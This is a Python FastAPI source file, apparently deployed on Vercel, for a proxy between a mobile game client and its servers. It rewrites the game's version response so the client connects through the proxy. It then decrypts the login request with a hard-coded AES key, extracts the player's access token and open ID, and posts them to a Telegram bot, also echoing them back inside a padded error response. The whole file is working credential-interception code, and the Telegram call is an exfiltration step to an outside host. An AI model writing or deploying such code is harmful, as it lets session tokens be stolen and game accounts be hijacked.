import os
import json
import httpx
import requests
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, Response
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
# Pastikan modul x7m tersedia dan berisi fungsi decrypt_api, get_available_room
from x7m import *

app = FastAPI()

# Baca dari environment variables (harus di-set di Vercel)
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

if not TOKEN or not CHAT_ID:
    print("WARNING: TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak diset, pengiriman pesan akan dilewati.")

Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()

def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

@app.api_route("/ver.php", methods=["GET", "POST"])
async def manual(request: Request):
    target = "https://version.ggwhitehawk.com/live/ver.php"
    headers = {
        k: v for k, v in request.headers.items()
        if k.lower() not in ("host", "content-length", "connection")
    }
    async with httpx.AsyncClient(follow_redirects=True) as client:
        r = await client.request(
            request.method,
            target,
            params=dict(request.query_params),
            headers=headers,
            content=await request.body()
        )
    data = r.json()
    data["server_url"] = "https://proxy-cgu.vercel.app"
    HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate',
                  'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
    response_headers = {
        k: v for k, v in r.headers.items()
        if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding")
    }
    return JSONResponse(content=data, status_code=r.status_code, headers=response_headers)

@app.api_route("/MajorLogin", methods=["POST"])
async def MajorLoginProxy(request: Request):
    print('major!')
    PyL = await request.body()
    x7m = json.loads(get_available_room(decrypt_api(PyL.hex())))
    acess_token, open_id = x7m["29"], x7m["22"]

    print("Sending To Telegram Bot ..")
    ff = f"""Access Token : {acess_token} .
Open_id : {open_id} .

By : CONVERTGAMINGUID

CGU PROXY."""

    # Kirim ke Telegram jika TOKEN dan CHAT_ID tersedia
    if TOKEN and CHAT_ID:
        try:
            r = requests.post(
                f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                params={'chat_id': CHAT_ID, 'text': ff}
            )
            if r.status_code == 200:  # 200 adalah sukses, bukan 201
                print('Sent Info !')
            else:
                print(f'Failed To Send ! status: {r.status_code}')
        except Exception as e:
            print(f"Error sending Telegram: {e}")
    else:
        print("Telegram credentials missing, skipping send.")

    nikomLhnoud = f""" [b][c][279CF5]














─────────────────────────────────────

[cccccc]access Token => [ff0000]{acess_token} [cccccc]| open id => [00ff00]{open_id}

[00ff00] CONVERTGAMINGUID




















                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    """

    return Response(content=nikomLhnoud, status_code=500, media_type="application/octet-stream")

# Tidak ada uvicorn.run() – Vercel akan mengimpor 'app'